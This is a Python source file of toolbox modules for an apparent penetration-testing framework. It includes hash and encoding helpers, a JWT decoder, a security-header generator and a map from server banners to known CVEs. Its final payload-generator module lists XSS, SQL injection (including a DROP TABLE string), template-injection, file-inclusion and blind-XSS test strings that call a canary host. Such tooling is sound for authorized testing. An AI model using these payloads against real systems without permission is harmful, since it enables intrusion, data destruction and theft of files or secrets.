"""Utility/toolbox modules: hash id, encoders, JWT decode, header generator, cve hints."""

import json
import re

from ..core import BaseModule, ModuleError
from .. import util as U
from .. import colors as C


class HashIdModule(BaseModule):
    NAME = "hash_id"
    DESCRIPTION = "Identify hash types and compute hashes for a given string"
    CATEGORY = "tools"

    HASHES = [
        (32, "MD5"), (40, "SHA-1"), (64, "SHA-256"), (128, "SHA-512"),
        (56, "SHA-224"), (96, "SHA-384"), (8, "CRC16"), (32, "CRC32 (dec)"),
    ]

    def options(self):
        return {"value": "string to hash/identify (or a hash to identify)"}

    def run(self):
        v = self.ctx.get_option("value", "")
        if not v:
            raise ModuleError("set 'value' option")
        is_hex = re.fullmatch(r"[0-9a-fA-F]+", v or "")
        if is_hex:
            for ln, name in self.HASHES:
                if len(v) == ln:
                    self.info("looks like %s (%d chars)" % (name, ln))
        print("   %-10s %s" % (C.c("md5:", C.BRIGHT_CYAN), U.md5(v)))
        print("   %-10s %s" % (C.c("sha1:", C.BRIGHT_CYAN), U.sha1(v)))
        print("   %-10s %s" % (C.c("sha256:", C.BRIGHT_CYAN), U.sha256(v)))
        print("   %-10s %s" % (C.c("b64:", C.BRIGHT_CYAN), U.b64e(v)))
        self.output({"md5": U.md5(v), "sha1": U.sha1(v), "sha256": U.sha256(v)})
        return "hash tools finished"


class EncoderModule(BaseModule):
    NAME = "encoder"
    DESCRIPTION = "Encode/decode: URL, base64, hex with round-trip output"
    CATEGORY = "tools"

    def options(self):
        return {"value": "input string", "mode": "encode|decode (default encode)"}

    def run(self):
        v = self.ctx.get_option("value", "")
        mode = (self.ctx.get_option("mode", "encode") or "encode").lower()
        if not v:
            raise ModuleError("set 'value' option")
        if mode == "decode":
            print("   %-10s %s" % (C.c("b64->", C.BRIGHT_CYAN), U.b64d(v)))
            print("   %-10s %s" % (C.c("url->", C.BRIGHT_CYAN), U.url_decode(v)))
            try:
                hx = bytes.fromhex(v.strip())
                print("   %-10s %s" % (C.c("hex->", C.BRIGHT_CYAN), hx.decode("utf-8", "replace")))
            except ValueError:
                pass
        else:
            print("   %-10s %s" % (C.c("b64:", C.BRIGHT_CYAN), U.b64e(v)))
            print("   %-10s %s" % (C.c("url:", C.BRIGHT_CYAN), U.url_encode(v)))
            print("   %-10s %s" % (C.c("hex:", C.BRIGHT_CYAN), v.encode("utf-8", "replace").hex()))
            print("   %-10s %s" % (C.c("hexsp:", C.BRIGHT_CYAN),
                                   " ".join("%02x" % b for b in v.encode("utf-8", "replace"))))
        return "encoder finished"


class JwtDecodeModule(BaseModule):
    NAME = "jwt_decode"
    DESCRIPTION = "Pretty-print a JWT header/payload without modifying it"
    CATEGORY = "tools"

    def options(self):
        return {"token": "JWT to decode"}

    def run(self):
        token = self.ctx.get_option("token", "").strip().replace("Bearer ", "")
        if not token:
            raise ModuleError("set 'token' option")
        parts = token.split(".")
        if len(parts) < 2:
            raise ModuleError("not a JWT")
        try:
            h = json.loads(U.b64d(parts[0]))
            p = json.loads(U.b64d(parts[1]))
        except Exception as exc:
            raise ModuleError("decode failed: %s" % exc)
        print("   HEADER:  %s" % json.dumps(h))
        print("   PAYLOAD: %s" % json.dumps(p))
        self.output({"header": h, "payload": p})
        return "jwt decoded"


class HeaderGenModule(BaseModule):
    NAME = "header_gen"
    DESCRIPTION = ("Generate a hardened security-headers snippet (nginx / apache / "
                   "express / caddy) for a domain")
    CATEGORY = "tools"

    def options(self):
        return {"domain": "domain to include in CSP", "server": "nginx|apache|express|caddy"}

    def run(self):
        dom = self.ctx.get_option("domain", "example.com")
        server = (self.ctx.get_option("server", "nginx") or "nginx").lower()
        csp = ("default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; "
               "style-src 'self'; img-src 'self' data:; object-src 'none'; "
               "frame-ancestors 'none'; base-uri 'self'")
        blocks = {
            "nginx": [
                "add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;",
                "add_header Content-Security-Policy \"%s\" always;" % csp,
                "add_header X-Content-Type-Options \"nosniff\" always;",
                "add_header X-Frame-Options \"DENY\" always;",
                "add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;",
                "add_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;",
                "add_header Set-Cookie \"Path=/; Secure; HttpOnly; SameSite=Lax\";",
            ],
            "apache": [
                "Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"",
                "Header always set Content-Security-Policy \"%s\"" % csp,
                "Header always set X-Content-Type-Options \"nosniff\"",
                "Header always set X-Frame-Options \"DENY\"",
                "Header always set Referrer-Policy \"strict-origin-when-cross-origin\"",
            ],
            "express": [
                "app.use(helmet());",
                "// helmet sets most headers; add CSP explicitly:",
                "app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\", \"'nonce-{RANDOM}'\"] } }));",
            ],
            "caddy": [
                "header {",
                "    Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"",
                "    X-Content-Type-Options \"nosniff\"",
                "    X-Frame-Options \"DENY\"",
                "    Referrer-Policy \"strict-origin-when-cross-origin\"",
                "}",
            ],
        }
        block = blocks.get(server, blocks["nginx"])
        print("   for %s (%s):" % (dom, server))
        for line in block:
            print("     " + line)
        self.output({"server": server, "config": block})
        return "header generator finished"


class CveHintsModule(BaseModule):
    NAME = "cve_hints"
    DESCRIPTION = ("Map discovered tech banners to known CVE hints "
                   "(offline mapping, verify on NVD)")
    CATEGORY = "tools"

    MAP = [
        (re.compile(r"apache/2\.4\.49", re.I), "CVE-2021-41773 (path traversal/RCE)"),
        (re.compile(r"apache/2\.4\.50", re.I), "CVE-2021-42013 (path traversal)"),
        (re.compile(r"nginx/1\.([0-9]|1[0-5])\.", re.I), "Check nginx CVEs 2021-2023 (resolver vulns)"),
        (re.compile(r"openssh_([1-7])\.", re.I), "Old OpenSSH - check user enum / RCE advisories"),
        (re.compile(r"php/([1-7])\.", re.I), "Old PHP - check CVE-2024-4577 etc."),
        (re.compile(r"iis/([1-8])\.", re.I), "Legacy IIS - check shortname/HTTP.sys CVE-2015-1635"),
        (re.compile(r"tomcat/([1-8])\.", re.I), "Old Tomcat - CVE-2017-12615 PUT upload"),
        (re.compile(r"spring boot", re.I), "Check actuator exposure + W1ndys/spring CVEs"),
        (re.compile(r"struts", re.I), "CVE-2017-5638 (Equifax RCE)"),
        (re.compile(r"log4j", re.I), "CVE-2021-44228 (Log4Shell) - test jndi safely"),
        (re.compile(r"exim", re.I), "CVE-2019-10149 (RCE)"),
        (re.compile(r"vsftpd 2\.3\.4", re.I), "CVE-2011-2523 backdoor"),
        (re.compile(r"openssl/1\.0", re.I), "Heartbleed era - CVE-2014-0160"),
        (re.compile(r"drupal [78]", re.I), "Drupalgeddon CVE-2018-7600"),
        (re.compile(r"wordpress ([1-5])\.", re.I), "Check wp plugins for known vulns (wpscan style)"),
    ]

    def options(self):
        return {"banner": "server banner text to analyze (or use target to fetch it)"}

    def run(self):
        banner = self.ctx.get_option("banner", "")
        if not banner:
            target = self.ctx.get_option("target") or (self.ctx.targets[0] if self.ctx.targets else None)
            if not target:
                raise ModuleError("set 'banner' or 'target'")
            _s, _h, _p, base = U.normalize_target(target)
            r = U.http_request(base, timeout=self.ctx.timeout, user_agent=self.ctx.user_agent)
            if r.ok:
                banner = " ".join("%s: %s" % (k, v) for k, v in r.headers.items())
        hits = []
        for rx, hint in self.MAP:
            m = rx.search(banner or "")
            if m:
                hits.append((m.group(0), hint))
                self.warn("%s -> %s" % (m.group(0), hint))
        if not hits:
            self.success("no known CVE hints for this banner")
        self.output({"banner": (banner or "")[:400], "hints": hits})
        self.info("always verify on https://nvd.nist.gov before reporting")
        return "cve hints finished (%d hints)" % len(hits)


class PayloadGenModule(BaseModule):
    NAME = "payload_gen"
    DESCRIPTION = "Generate common test payloads (XSS/SSTI/SQLi/SSTI polyglot) for manual testing"
    CATEGORY = "tools"

    def options(self):
        return {"type": "xss|sqli|ssti|lfi|all (default all)",
                "domain": "your canary domain for blind tests (optional)"}

    def run(self):
        t = (self.ctx.get_option("type", "all") or "all").lower()
        dom = self.ctx.get_option("domain", "canary.example.com")
        packs = {
            "xss": ['<script>alert(1)</script>', '"><svg/onload=alert(1)>',
                    "<img src=x onerror=alert(1)>", "javascript:alert(1)",
                    "'\"><details/open/ontoggle=alert(1)>"],
            "sqli": ["' OR '1'='1", "1 UNION SELECT NULL,NULL--",
                     "1; DROP TABLE users--", "1 AND SLEEP(5)--",
                     "1' AND 1=1-- -"],
            "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                     "{{constructor.constructor('return process.env')()}}"],
            "lfi": ["../../../etc/passwd", "....//....//etc/passwd",
                    "php://filter/convert.base64-encode/resource=index",
                    "file:///etc/passwd"],
            "blind": ["<script src=https://%s></script>" % dom,
                      "https://%s/x" % dom,
                      "\"\"><img src=https://%s/img>" % dom],
        }
        for key in (packs if t == "all" else {t: packs.get(t, [])}):
            print("   %s" % C.c(key.upper(), C.BRIGHT_MAGENTA, C.BOLD))
            for p in packs[key]:
                print("     - %s" % p)
        self.output({"packs": packs})
        return "payload generator finished"
